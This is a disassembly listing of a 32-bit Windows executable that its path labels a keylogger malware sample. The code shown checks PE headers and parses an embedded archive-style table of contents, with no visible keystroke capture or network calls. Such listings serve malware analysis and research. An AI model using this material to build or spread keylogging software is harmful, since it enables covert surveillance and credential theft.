
malware_samples/keylogger/58913e39fbf6156de846cdd02999602d7f0dadfec582c51bd786528320af894a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	56                   	push   %esi
  401001:	e8 f0 88 00 00       	call   0x4098f6
  401006:	8b f0                	mov    %eax,%esi
  401008:	e8 e3 88 00 00       	call   0x4098f0
  40100d:	ff 36                	push   (%esi)
  40100f:	ff 30                	push   (%eax)
  401011:	e8 8a 3a 00 00       	call   0x404aa0
  401016:	8b f0                	mov    %eax,%esi
  401018:	e8 d3 88 00 00       	call   0x4098f0
  40101d:	56                   	push   %esi
  40101e:	ff 30                	push   (%eax)
  401020:	e8 fb 14 00 00       	call   0x402520
  401025:	83 c4 10             	add    $0x10,%esp
  401028:	5e                   	pop    %esi
  401029:	c2 10 00             	ret    $0x10
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	83 ec 38             	sub    $0x38,%esp
  401033:	56                   	push   %esi
  401034:	57                   	push   %edi
  401035:	8b 7c 24 48          	mov    0x48(%esp),%edi
  401039:	ff 77 0c             	push   0xc(%edi)
  40103c:	e8 1d 6a 00 00       	call   0x407a5e
  401041:	50                   	push   %eax
  401042:	e8 14 8c 00 00       	call   0x409c5b
  401047:	8b f0                	mov    %eax,%esi
  401049:	83 c4 04             	add    $0x4,%esp
  40104c:	85 f6                	test   %esi,%esi
  40104e:	75 15                	jne    0x401065
  401050:	68 14 02 42 00       	push   $0x420214
  401055:	e8 26 0a 00 00       	call   0x401a80
  40105a:	83 c4 04             	add    $0x4,%esp
  40105d:	33 c0                	xor    %eax,%eax
  40105f:	5f                   	pop    %edi
  401060:	5e                   	pop    %esi
  401061:	83 c4 38             	add    $0x38,%esp
  401064:	c3                   	ret
  401065:	8b 44 24 44          	mov    0x44(%esp),%eax
  401069:	ff 77 08             	push   0x8(%edi)
  40106c:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  401073:	00 
  401074:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  40107b:	00 
  40107c:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  401083:	00 
  401084:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401088:	e8 d1 69 00 00       	call   0x407a5e
  40108d:	ff 77 0c             	push   0xc(%edi)
  401090:	89 44 24 10          	mov    %eax,0x10(%esp)
  401094:	89 74 24 18          	mov    %esi,0x18(%esp)
  401098:	e8 c1 69 00 00       	call   0x407a5e
  40109d:	6a 38                	push   $0x38
  40109f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4010a3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4010a7:	68 3c 02 42 00       	push   $0x42023c
  4010ac:	50                   	push   %eax
  4010ad:	e8 5e 58 00 00       	call   0x406910
  4010b2:	83 c4 0c             	add    $0xc,%esp
  4010b5:	85 c0                	test   %eax,%eax
  4010b7:	78 42                	js     0x4010fb
  4010b9:	8d 44 24 08          	lea    0x8(%esp),%eax
  4010bd:	6a 04                	push   $0x4
  4010bf:	50                   	push   %eax
  4010c0:	e8 8b 3f 00 00       	call   0x405050
  4010c5:	83 c4 08             	add    $0x8,%esp
  4010c8:	85 c0                	test   %eax,%eax
  4010ca:	78 15                	js     0x4010e1
  4010cc:	8d 44 24 08          	lea    0x8(%esp),%eax
  4010d0:	50                   	push   %eax
  4010d1:	e8 0a 57 00 00       	call   0x4067e0
  4010d6:	83 c4 04             	add    $0x4,%esp
  4010d9:	8b c6                	mov    %esi,%eax
  4010db:	5f                   	pop    %edi
  4010dc:	5e                   	pop    %esi
  4010dd:	83 c4 38             	add    $0x38,%esp
  4010e0:	c3                   	ret
  4010e1:	ff 74 24 20          	push   0x20(%esp)
  4010e5:	50                   	push   %eax
  4010e6:	68 44 02 42 00       	push   $0x420244
  4010eb:	e8 90 09 00 00       	call   0x401a80
  4010f0:	83 c4 0c             	add    $0xc,%esp
  4010f3:	33 c0                	xor    %eax,%eax
  4010f5:	5f                   	pop    %edi
  4010f6:	5e                   	pop    %esi
  4010f7:	83 c4 38             	add    $0x38,%esp
  4010fa:	c3                   	ret
  4010fb:	ff 74 24 20          	push   0x20(%esp)
  4010ff:	50                   	push   %eax
  401100:	68 60 02 42 00       	push   $0x420260
  401105:	e8 76 09 00 00       	call   0x401a80
  40110a:	83 c4 0c             	add    $0xc,%esp
  40110d:	33 c0                	xor    %eax,%eax
  40110f:	5f                   	pop    %edi
  401110:	5e                   	pop    %esi
  401111:	83 c4 38             	add    $0x38,%esp
  401114:	c3                   	ret
  401115:	cc                   	int3
  401116:	cc                   	int3
  401117:	cc                   	int3
  401118:	cc                   	int3
  401119:	cc                   	int3
  40111a:	cc                   	int3
  40111b:	cc                   	int3
  40111c:	cc                   	int3
  40111d:	cc                   	int3
  40111e:	cc                   	int3
  40111f:	cc                   	int3
  401120:	51                   	push   %ecx
  401121:	56                   	push   %esi
  401122:	8b 74 24 0c          	mov    0xc(%esp),%esi
  401126:	6a 00                	push   $0x0
  401128:	6a 00                	push   $0x0
  40112a:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401131:	00 
  401132:	ff 36                	push   (%esi)
  401134:	e8 30 92 00 00       	call   0x40a369
  401139:	ff 36                	push   (%esi)
  40113b:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40113f:	6a 02                	push   $0x2
  401141:	6a 01                	push   $0x1
  401143:	50                   	push   %eax
  401144:	e8 35 8e 00 00       	call   0x409f7e
  401149:	66 8b 44 24 28       	mov    0x28(%esp),%ax
  40114e:	83 c4 1c             	add    $0x1c,%esp
  401151:	3c 4d                	cmp    $0x4d,%al
  401153:	0f 85 99 00 00 00    	jne    0x4011f2
  401159:	80 fc 5a             	cmp    $0x5a,%ah
  40115c:	0f 85 90 00 00 00    	jne    0x4011f2
  401162:	6a 00                	push   $0x0
  401164:	6a 3c                	push   $0x3c
  401166:	ff 36                	push   (%esi)
  401168:	e8 fc 91 00 00       	call   0x40a369
  40116d:	ff 36                	push   (%esi)
  40116f:	8d 44 24 14          	lea    0x14(%esp),%eax
  401173:	6a 01                	push   $0x1
  401175:	6a 04                	push   $0x4
  401177:	50                   	push   %eax
  401178:	e8 01 8e 00 00       	call   0x409f7e
  40117d:	8b 44 24 20          	mov    0x20(%esp),%eax
  401181:	6a 00                	push   $0x0
  401183:	83 c0 18             	add    $0x18,%eax
  401186:	50                   	push   %eax
  401187:	ff 36                	push   (%esi)
  401189:	e8 db 91 00 00       	call   0x40a369
  40118e:	ff 36                	push   (%esi)
  401190:	8d 44 24 38          	lea    0x38(%esp),%eax
  401194:	6a 01                	push   $0x1
  401196:	6a 02                	push   $0x2
  401198:	50                   	push   %eax
  401199:	e8 e0 8d 00 00       	call   0x409f7e
  40119e:	66 8b 44 24 44       	mov    0x44(%esp),%ax
  4011a3:	83 c4 38             	add    $0x38,%esp
  4011a6:	3c 0b                	cmp    $0xb,%al
  4011a8:	75 48                	jne    0x4011f2
  4011aa:	80 fc 01             	cmp    $0x1,%ah
  4011ad:	75 07                	jne    0x4011b6
  4011af:	b9 98 00 00 00       	mov    $0x98,%ecx
  4011b4:	eb 0a                	jmp    0x4011c0
  4011b6:	80 fc 02             	cmp    $0x2,%ah
  4011b9:	75 37                	jne    0x4011f2
  4011bb:	b9 a8 00 00 00       	mov    $0xa8,%ecx
  4011c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011c4:	6a 00                	push   $0x0
  4011c6:	03 c1                	add    %ecx,%eax
  4011c8:	50                   	push   %eax
  4011c9:	ff 36                	push   (%esi)
  4011cb:	e8 99 91 00 00       	call   0x40a369
  4011d0:	ff 36                	push   (%esi)
  4011d2:	8d 44 24 14          	lea    0x14(%esp),%eax
  4011d6:	6a 01                	push   $0x1
  4011d8:	6a 04                	push   $0x4
  4011da:	50                   	push   %eax
  4011db:	e8 9e 8d 00 00       	call   0x409f7e
  4011e0:	8b 44 24 20          	mov    0x20(%esp),%eax
  4011e4:	83 c4 1c             	add    $0x1c,%esp
  4011e7:	83 c9 ff             	or     $0xffffffff,%ecx
  4011ea:	85 c0                	test   %eax,%eax
  4011ec:	0f 44 c1             	cmove  %ecx,%eax
  4011ef:	5e                   	pop    %esi
  4011f0:	59                   	pop    %ecx
  4011f1:	c3                   	ret
  4011f2:	83 c8 ff             	or     $0xffffffff,%eax
  4011f5:	5e                   	pop    %esi
  4011f6:	59                   	pop    %ecx
  4011f7:	c3                   	ret
  4011f8:	cc                   	int3
  4011f9:	cc                   	int3
  4011fa:	cc                   	int3
  4011fb:	cc                   	int3
  4011fc:	cc                   	int3
  4011fd:	cc                   	int3
  4011fe:	cc                   	int3
  4011ff:	cc                   	int3
  401200:	56                   	push   %esi
  401201:	8b 74 24 08          	mov    0x8(%esp),%esi
  401205:	8b 06                	mov    (%esi),%eax
  401207:	85 c0                	test   %eax,%eax
  401209:	74 0f                	je     0x40121a
  40120b:	50                   	push   %eax
  40120c:	e8 cb 8a 00 00       	call   0x409cdc
  401211:	83 c4 04             	add    $0x4,%esp
  401214:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40121a:	5e                   	pop    %esi
  40121b:	c3                   	ret
  40121c:	cc                   	int3
  40121d:	cc                   	int3
  40121e:	cc                   	int3
  40121f:	cc                   	int3
  401220:	57                   	push   %edi
  401221:	8b 7c 24 08          	mov    0x8(%esp),%edi
  401225:	83 3f 00             	cmpl   $0x0,(%edi)
  401228:	75 28                	jne    0x401252
  40122a:	8d 47 68             	lea    0x68(%edi),%eax
  40122d:	68 10 02 42 00       	push   $0x420210
  401232:	50                   	push   %eax
  401233:	e8 28 17 00 00       	call   0x402960
  401238:	83 c4 08             	add    $0x8,%esp
  40123b:	89 07                	mov    %eax,(%edi)
  40123d:	85 c0                	test   %eax,%eax
  40123f:	75 11                	jne    0x401252
  401241:	68 80 02 42 00       	push   $0x420280
  401246:	e8 35 08 00 00       	call   0x401a80
  40124b:	83 c4 04             	add    $0x4,%esp
  40124e:	33 c0                	xor    %eax,%eax
  401250:	5f                   	pop    %edi
  401251:	c3                   	ret
  401252:	53                   	push   %ebx
  401253:	55                   	push   %ebp
  401254:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401258:	6a 00                	push   $0x0
  40125a:	ff 75 04             	push   0x4(%ebp)
  40125d:	e8 fc 67 00 00       	call   0x407a5e
  401262:	03 47 04             	add    0x4(%edi),%eax
  401265:	50                   	push   %eax
  401266:	ff 37                	push   (%edi)
  401268:	e8 fc 90 00 00       	call   0x40a369
  40126d:	83 c4 0c             	add    $0xc,%esp
  401270:	ff 75 08             	push   0x8(%ebp)
  401273:	e8 e6 67 00 00       	call   0x407a5e
  401278:	50                   	push   %eax
  401279:	e8 dd 89 00 00       	call   0x409c5b
  40127e:	8b d8                	mov    %eax,%ebx
  401280:	83 c4 04             	add    $0x4,%esp
  401283:	85 db                	test   %ebx,%ebx
  401285:	75 13                	jne    0x40129a
  401287:	68 9c 02 42 00       	push   $0x42029c
  40128c:	e8 ef 07 00 00       	call   0x401a80
  401291:	83 c4 04             	add    $0x4,%esp
  401294:	33 c0                	xor    %eax,%eax
  401296:	5d                   	pop    %ebp
  401297:	5b                   	pop    %ebx
  401298:	5f                   	pop    %edi
  401299:	c3                   	ret
  40129a:	ff 37                	push   (%edi)
  40129c:	6a 01                	push   $0x1
  40129e:	ff 75 08             	push   0x8(%ebp)
  4012a1:	e8 b8 67 00 00       	call   0x407a5e
  4012a6:	50                   	push   %eax
  4012a7:	53                   	push   %ebx
  4012a8:	e8 d1 8c 00 00       	call   0x409f7e
  4012ad:	83 c4 10             	add    $0x10,%esp
  4012b0:	83 f8 01             	cmp    $0x1,%eax
  4012b3:	73 19                	jae    0x4012ce
  4012b5:	68 bc 02 42 00       	push   $0x4202bc
  4012ba:	e8 c1 07 00 00       	call   0x401a80
  4012bf:	53                   	push   %ebx
  4012c0:	e8 91 89 00 00       	call   0x409c56
  4012c5:	83 c4 08             	add    $0x8,%esp
  4012c8:	33 c0                	xor    %eax,%eax
  4012ca:	5d                   	pop    %ebp
  4012cb:	5b                   	pop    %ebx
  4012cc:	5f                   	pop    %edi
  4012cd:	c3                   	ret
  4012ce:	80 7d 10 01          	cmpb   $0x1,0x10(%ebp)
  4012d2:	75 31                	jne    0x401305
  4012d4:	56                   	push   %esi
  4012d5:	55                   	push   %ebp
  4012d6:	53                   	push   %ebx
  4012d7:	e8 54 fd ff ff       	call   0x401030
  4012dc:	53                   	push   %ebx
  4012dd:	8b f0                	mov    %eax,%esi
  4012df:	e8 72 89 00 00       	call   0x409c56
  4012e4:	83 c4 0c             	add    $0xc,%esp
  4012e7:	8b de                	mov    %esi,%ebx
  4012e9:	85 f6                	test   %esi,%esi
  4012eb:	5e                   	pop    %esi
  4012ec:	75 17                	jne    0x401305
  4012ee:	8d 45 12             	lea    0x12(%ebp),%eax
  4012f1:	50                   	push   %eax
  4012f2:	68 d8 02 42 00       	push   $0x4202d8
  4012f7:	e8 84 07 00 00       	call   0x401a80
  4012fc:	83 c4 08             	add    $0x8,%esp
  4012ff:	33 c0                	xor    %eax,%eax
  401301:	5d                   	pop    %ebp
  401302:	5b                   	pop    %ebx
  401303:	5f                   	pop    %edi
  401304:	c3                   	ret
  401305:	8b 07                	mov    (%edi),%eax
  401307:	85 c0                	test   %eax,%eax
  401309:	74 0f                	je     0x40131a
  40130b:	50                   	push   %eax
  40130c:	e8 cb 89 00 00       	call   0x409cdc
  401311:	83 c4 04             	add    $0x4,%esp
  401314:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  40131a:	5d                   	pop    %ebp
  40131b:	8b c3                	mov    %ebx,%eax
  40131d:	5b                   	pop    %ebx
  40131e:	5f                   	pop    %edi
  40131f:	c3                   	ret
  401320:	53                   	push   %ebx
  401321:	55                   	push   %ebp
  401322:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401326:	56                   	push   %esi
  401327:	8b 74 24 10          	mov    0x10(%esp),%esi
  40132b:	55                   	push   %ebp
  40132c:	56                   	push   %esi
  40132d:	e8 ee fe ff ff       	call   0x401220
  401332:	56                   	push   %esi
  401333:	8b d8                	mov    %eax,%ebx
  401335:	e8 16 29 00 00       	call   0x403c50
  40133a:	83 c4 0c             	add    $0xc,%esp
  40133d:	83 f8 ff             	cmp    $0xffffffff,%eax
  401340:	75 06                	jne    0x401348
  401342:	5e                   	pop    %esi
  401343:	5d                   	pop    %ebp
  401344:	0b c0                	or     %eax,%eax
  401346:	5b                   	pop    %ebx
  401347:	c3                   	ret
  401348:	57                   	push   %edi
  401349:	8d 7d 12             	lea    0x12(%ebp),%edi
  40134c:	8d 86 68 20 00 00    	lea    0x2068(%esi),%eax
  401352:	57                   	push   %edi
  401353:	50                   	push   %eax
  401354:	e8 e7 2b 00 00       	call   0x403f40
  401359:	83 c4 08             	add    $0x8,%esp
  40135c:	8b f0                	mov    %eax,%esi
  40135e:	ff 75 0c             	push   0xc(%ebp)
  401361:	e8 f8 66 00 00       	call   0x407a5e
  401366:	8b e8                	mov    %eax,%ebp
  401368:	85 f6                	test   %esi,%esi
  40136a:	75 1b                	jne    0x401387
  40136c:	57                   	push   %edi
  40136d:	68 f0 02 42 00       	push   $0x4202f0
  401372:	68 0c 03 42 00       	push   $0x42030c
  401377:	e8 74 04 00 00       	call   0x4017f0
  40137c:	83 c4 0c             	add    $0xc,%esp
  40137f:	83 c8 ff             	or     $0xffffffff,%eax
  401382:	5f                   	pop    %edi
  401383:	5e                   	pop    %esi
  401384:	5d                   	pop    %ebp
  401385:	5b                   	pop    %ebx
  401386:	c3                   	ret
  401387:	56                   	push   %esi
  401388:	6a 01                	push   $0x1
  40138a:	55                   	push   %ebp
  40138b:	53                   	push   %ebx
  40138c:	e8 8d 97 00 00       	call   0x40ab1e
  401391:	83 c4 10             	add    $0x10,%esp
  401394:	83 f8 01             	cmp    $0x1,%eax
  401397:	74 1f                	je     0x4013b8
  401399:	85 ed                	test   %ebp,%ebp
  40139b:	74 1b                	je     0x4013b8
  40139d:	57                   	push   %edi
  40139e:	68 14 03 42 00       	push   $0x420314
  4013a3:	68 38 03 42 00       	push   $0x420338
  4013a8:	e8 43 04 00 00       	call   0x4017f0
  4013ad:	83 c4 0c             	add    $0xc,%esp
  4013b0:	83 c8 ff             	or     $0xffffffff,%eax
  4013b3:	5f                   	pop    %edi
  4013b4:	5e                   	pop    %esi
  4013b5:	5d                   	pop    %ebp
  4013b6:	5b                   	pop    %ebx
  4013b7:	c3                   	ret
  4013b8:	56                   	push   %esi
  4013b9:	e8 1e 89 00 00       	call   0x409cdc
  4013be:	53                   	push   %ebx
  4013bf:	e8 92 88 00 00       	call   0x409c56
  4013c4:	83 c4 08             	add    $0x8,%esp
  4013c7:	33 c0                	xor    %eax,%eax
  4013c9:	5f                   	pop    %edi
  4013ca:	5e                   	pop    %esi
  4013cb:	5d                   	pop    %ebp
  4013cc:	5b                   	pop    %ebx
  4013cd:	c3                   	ret
  4013ce:	cc                   	int3
  4013cf:	cc                   	int3
  4013d0:	83 ec 64             	sub    $0x64,%esp
  4013d3:	a1 08 c0 42 00       	mov    0x42c008,%eax
  4013d8:	33 c4                	xor    %esp,%eax
  4013da:	89 44 24 60          	mov    %eax,0x60(%esp)
  4013de:	53                   	push   %ebx
  4013df:	8b 5c 24 70          	mov    0x70(%esp),%ebx
  4013e3:	56                   	push   %esi
  4013e4:	57                   	push   %edi
  4013e5:	8b 7c 24 74          	mov    0x74(%esp),%edi
  4013e9:	8d 74 24 14          	lea    0x14(%esp),%esi
  4013ed:	6a 00                	push   $0x0
  4013ef:	83 c3 a0             	add    $0xffffffa0,%ebx
  4013f2:	53                   	push   %ebx
  4013f3:	ff 37                	push   (%edi)
  4013f5:	e8 6f 8f 00 00       	call   0x40a369
  4013fa:	83 c4 0c             	add    $0xc,%esp
  4013fd:	85 c0                	test   %eax,%eax
  4013ff:	75 3c                	jne    0x40143d
  401401:	ff 37                	push   (%edi)
  401403:	8d 44 24 10          	lea    0x10(%esp),%eax
  401407:	6a 01                	push   $0x1
  401409:	6a 60                	push   $0x60
  40140b:	50                   	push   %eax
  40140c:	e8 6d 8b 00 00       	call   0x409f7e
  401411:	83 c4 10             	add    $0x10,%esp
  401414:	83 f8 01             	cmp    $0x1,%eax
  401417:	72 24                	jb     0x40143d
  401419:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401420:	6a 08                	push   $0x8
  401422:	56                   	push   %esi
  401423:	68 40 03 42 00       	push   $0x420340
  401428:	e8 d3 84 00 00       	call   0x409900
  40142d:	83 c4 0c             	add    $0xc,%esp
  401430:	85 c0                	test   %eax,%eax
  401432:	74 1e                	je     0x401452
  401434:	4e                   	dec    %esi
  401435:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401439:	3b f0                	cmp    %eax,%esi
  40143b:	73 e3                	jae    0x401420
  40143d:	5f                   	pop    %edi
  40143e:	5e                   	pop    %esi
  40143f:	83 c8 ff             	or     $0xffffffff,%eax
  401442:	5b                   	pop    %ebx
  401443:	8b 4c 24 60          	mov    0x60(%esp),%ecx
  401447:	33 cc                	xor    %esp,%ecx
  401449:	e8 16 66 00 00       	call   0x407a64
  40144e:	83 c4 64             	add    $0x64,%esp
  401451:	c3                   	ret
  401452:	0f 10 06             	movups (%esi),%xmm0
  401455:	0f 11 47 10          	movups %xmm0,0x10(%edi)
  401459:	0f 10 46 10          	movups 0x10(%esi),%xmm0
  40145d:	0f 11 47 20          	movups %xmm0,0x20(%edi)
  401461:	0f 10 46 20          	movups 0x20(%esi),%xmm0
  401465:	0f 11 47 30          	movups %xmm0,0x30(%edi)
  401469:	0f 10 46 30          	movups 0x30(%esi),%xmm0
  40146d:	0f 11 47 40          	movups %xmm0,0x40(%edi)
  401471:	0f 10 46 40          	movups 0x40(%esi),%xmm0
  401475:	0f 11 47 50          	movups %xmm0,0x50(%edi)
  401479:	f3 0f 7e 46 50       	movq   0x50(%esi),%xmm0
  40147e:	66 0f d6 47 60       	movq   %xmm0,0x60(%edi)
  401483:	ff 77 18             	push   0x18(%edi)
  401486:	e8 d3 65 00 00       	call   0x407a5e
  40148b:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40148f:	2b f1                	sub    %ecx,%esi
  401491:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  401495:	03 f3                	add    %ebx,%esi
  401497:	2b f0                	sub    %eax,%esi
  401499:	33 c0                	xor    %eax,%eax
  40149b:	83 c6 58             	add    $0x58,%esi
  40149e:	89 77 04             	mov    %esi,0x4(%edi)
  4014a1:	5f                   	pop    %edi
  4014a2:	5e                   	pop    %esi
  4014a3:	5b                   	pop    %ebx
  4014a4:	33 cc                	xor    %esp,%ecx
  4014a6:	e8 b9 65 00 00       	call   0x407a64
  4014ab:	83 c4 64             	add    $0x64,%esp
  4014ae:	c3                   	ret
  4014af:	cc                   	int3
  4014b0:	53                   	push   %ebx
  4014b1:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4014b5:	55                   	push   %ebp
  4014b6:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4014ba:	56                   	push   %esi
  4014bb:	8b 73 08             	mov    0x8(%ebx),%esi
  4014be:	57                   	push   %edi
  4014bf:	8b fd                	mov    %ebp,%edi
  4014c1:	8d 4f 01             	lea    0x1(%edi),%ecx
  4014c4:	8a 07                	mov    (%edi),%al
  4014c6:	47                   	inc    %edi
  4014c7:	84 c0                	test   %al,%al
  4014c9:	75 f9                	jne    0x4014c4
  4014cb:	2b f9                	sub    %ecx,%edi
  4014cd:	3b 73 0c             	cmp    0xc(%ebx),%esi
  4014d0:	73 3b                	jae    0x40150d
  4014d2:	80 7e 11 6f          	cmpb   $0x6f,0x11(%esi)
  4014d6:	75 12                	jne    0x4014ea
  4014d8:	57                   	push   %edi
  4014d9:	8d 46 12             	lea    0x12(%esi),%eax
  4014dc:	55                   	push   %ebp
  4014dd:	50                   	push   %eax
  4014de:	e8 1d 84 00 00       	call   0x409900
  4014e3:	83 c4 0c             	add    $0xc,%esp
  4014e6:	85 c0                	test   %eax,%eax
  4014e8:	74 2a                	je     0x401514
  4014ea:	ff 36                	push   (%esi)
  4014ec:	e8 6d 65 00 00       	call   0x407a5e
  4014f1:	03 f0                	add    %eax,%esi
  4014f3:	3b 73 08             	cmp    0x8(%ebx),%esi
  4014f6:	73 10                	jae    0x401508
  4014f8:	68 f0 01 42 00       	push   $0x4201f0
  4014fd:	e8 0e 05 00 00       	call   0x401a10
  401502:	8b 73 0c             	mov    0xc(%ebx),%esi
  401505:	83 c4 04             	add    $0x4,%esp
  401508:	3b 73 0c             	cmp    0xc(%ebx),%esi
  40150b:	72 c5                	jb     0x4014d2
  40150d:	33 c0                	xor    %eax,%eax
  40150f:	5f                   	pop    %edi
  401510:	5e                   	pop    %esi
  401511:	5d                   	pop    %ebp
  401512:	5b                   	pop    %ebx
  401513:	c3                   	ret
  401514:	8d 46 12             	lea    0x12(%esi),%eax
  401517:	03 c7                	add    %edi,%eax
  401519:	80 38 00             	cmpb   $0x0,(%eax)
  40151c:	74 f1                	je     0x40150f
  40151e:	8d 46 13             	lea    0x13(%esi),%eax
  401521:	03 c7                	add    %edi,%eax
  401523:	5f                   	pop    %edi
  401524:	5e                   	pop    %esi
  401525:	5d                   	pop    %ebp
  401526:	5b                   	pop    %ebx
  401527:	c3                   	ret
  401528:	cc                   	int3
  401529:	cc                   	int3
  40152a:	cc                   	int3
  40152b:	cc                   	int3
  40152c:	cc                   	int3
  40152d:	cc                   	int3
  40152e:	cc                   	int3
  40152f:	cc                   	int3
  401530:	56                   	push   %esi
  401531:	8b 74 24 0c          	mov    0xc(%esp),%esi
  401535:	ff 36                	push   (%esi)
  401537:	e8 22 65 00 00       	call   0x407a5e
  40153c:	03 c6                	add    %esi,%eax
  40153e:	8b 74 24 08          	mov    0x8(%esp),%esi
  401542:	3b 46 08             	cmp    0x8(%esi),%eax
  401545:	73 10                	jae    0x401557
  401547:	68 f0 01 42 00       	push   $0x4201f0
  40154c:	e8 bf 04 00 00       	call   0x401a10
  401551:	8b 46 0c             	mov    0xc(%esi),%eax
  401554:	83 c4 04             	add    $0x4,%esp
  401557:	5e                   	pop    %esi
  401558:	c3                   	ret
  401559:	cc                   	int3
  40155a:	cc                   	int3
  40155b:	cc                   	int3
  40155c:	cc                   	int3
  40155d:	cc                   	int3
  40155e:	cc                   	int3
  40155f:	cc                   	int3
  401560:	56                   	push   %esi
  401561:	8b 74 24 08          	mov    0x8(%esp),%esi
  401565:	83 3e 00             	cmpl   $0x0,(%esi)
  401568:	75 1b                	jne    0x401585
  40156a:	8d 46 68             	lea    0x68(%esi),%eax
  40156d:	68 10 02 42 00       	push   $0x420210
  401572:	50                   	push   %eax
  401573:	e8 e8 13 00 00       	call   0x402960
  401578:	83 c4 08             	add    $0x8,%esp
  40157b:	89 06                	mov    %eax,(%esi)
  40157d:	85 c0                	test   %eax,%eax
  40157f:	0f 84 8b 00 00 00    	je     0x401610
  401585:	56                   	push   %esi
  401586:	e8 95 fb ff ff       	call   0x401120
  40158b:	83 c4 04             	add    $0x4,%esp
  40158e:	83 f8 01             	cmp    $0x1,%eax
  401591:	7d 15                	jge    0x4015a8
  401593:	6a 02                	push   $0x2
  401595:	6a 00                	push   $0x0
  401597:	ff 36                	push   (%esi)
  401599:	e8 cb 8d 00 00       	call   0x40a369
  40159e:	ff 36                	push   (%esi)
  4015a0:	e8 36 93 00 00       	call   0x40a8db
  4015a5:	83 c4 10             	add    $0x10,%esp
  4015a8:	50                   	push   %eax
  4015a9:	56                   	push   %esi
  4015aa:	e8 21 fe ff ff       	call   0x4013d0
  4015af:	83 c4 08             	add    $0x8,%esp
  4015b2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4015b5:	74 59                	je     0x401610
  4015b7:	ff 76 24             	push   0x24(%esi)
  4015ba:	c7 86 6c 40 00 00 00 	movl   $0x0,0x406c(%esi)
  4015c1:	00 00 00 
  4015c4:	e8 95 64 00 00       	call   0x407a5e
  4015c9:	6a 00                	push   $0x0
  4015cb:	a3 54 c9 42 00       	mov    %eax,0x42c954
  4015d0:	ff 76 1c             	push   0x1c(%esi)
  4015d3:	e8 86 64 00 00       	call   0x407a5e
  4015d8:	03 46 04             	add    0x4(%esi),%eax
  4015db:	50                   	push   %eax
  4015dc:	ff 36                	push   (%esi)
  4015de:	e8 86 8d 00 00       	call   0x40a369
  4015e3:	83 c4 0c             	add    $0xc,%esp
  4015e6:	ff 76 20             	push   0x20(%esi)
  4015e9:	e8 70 64 00 00       	call   0x407a5e
  4015ee:	50                   	push   %eax
  4015ef:	e8 67 86 00 00       	call   0x409c5b
  4015f4:	83 c4 04             	add    $0x4,%esp
  4015f7:	89 46 08             	mov    %eax,0x8(%esi)
  4015fa:	85 c0                	test   %eax,%eax
  4015fc:	75 17                	jne    0x401615
  4015fe:	68 4c 03 42 00       	push   $0x42034c
  401603:	68 70 03 42 00       	push   $0x420370
  401608:	e8 e3 01 00 00       	call   0x4017f0
  40160d:	83 c4 08             	add    $0x8,%esp
  401610:	83 c8 ff             	or     $0xffffffff,%eax
  401613:	5e                   	pop    %esi
  401614:	c3                   	ret
  401615:	ff 36                	push   (%esi)
  401617:	6a 01                	push   $0x1
  401619:	ff 76 20             	push   0x20(%esi)
  40161c:	e8 3d 64 00 00       	call   0x407a5e
  401621:	50                   	push   %eax
  401622:	ff 76 08             	push   0x8(%esi)
  401625:	e8 54 89 00 00       	call   0x409f7e
  40162a:	83 c4 10             	add    $0x10,%esp
  40162d:	83 f8 01             	cmp    $0x1,%eax
  401630:	73 17                	jae    0x401649
  401632:	68 78 03 42 00       	push   $0x420378
  401637:	68 94 03 42 00       	push   $0x420394
  40163c:	e8 af 01 00 00       	call   0x4017f0
  401641:	83 c4 08             	add    $0x8,%esp
  401644:	83 c8 ff             	or     $0xffffffff,%eax
  401647:	5e                   	pop    %esi
  401648:	c3                   	ret
  401649:	ff 76 20             	push   0x20(%esi)
  40164c:	e8 0d 64 00 00       	call   0x407a5e
  401651:	03 46 08             	add    0x8(%esi),%eax
  401654:	ff 36                	push   (%esi)
  401656:	89 46 0c             	mov    %eax,0xc(%esi)
  401659:	e8 29 87 00 00       	call   0x409d87
  40165e:	83 c4 04             	add    $0x4,%esp
  401661:	85 c0                	test   %eax,%eax
  401663:	74 12                	je     0x401677
  401665:	68 9c 03 42 00       	push   $0x42039c
  40166a:	e8 a1 03 00 00       	call   0x401a10
  40166f:	83 c4 04             	add    $0x4,%esp
  401672:	83 c8 ff             	or     $0xffffffff,%eax
  401675:	5e                   	pop    %esi
  401676:	c3                   	ret
  401677:	56                   	push   %esi
  401678:	e8 83 fb ff ff       	call   0x401200
  40167d:	83 c4 04             	add    $0x4,%esp
  401680:	33 c0                	xor    %eax,%eax
  401682:	5e                   	pop    %esi
  401683:	c3                   	ret
  401684:	cc                   	int3
  401685:	cc                   	int3
  401686:	cc                   	int3
  401687:	cc                   	int3
  401688:	cc                   	int3
  401689:	cc                   	int3
  40168a:	cc                   	int3
  40168b:	cc                   	int3
  40168c:	cc                   	int3
  40168d:	cc                   	int3
  40168e:	cc                   	int3
  40168f:	cc                   	int3
  401690:	53                   	push   %ebx
  401691:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401695:	55                   	push   %ebp
  401696:	56                   	push   %esi
  401697:	68 00 10 00 00       	push   $0x1000
  40169c:	53                   	push   %ebx
  40169d:	e8 d6 82 00 00       	call   0x409978
  4016a2:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4016a6:	8b f0                	mov    %eax,%esi
  4016a8:	68 00 10 00 00       	push   $0x1000
  4016ad:	55                   	push   %ebp
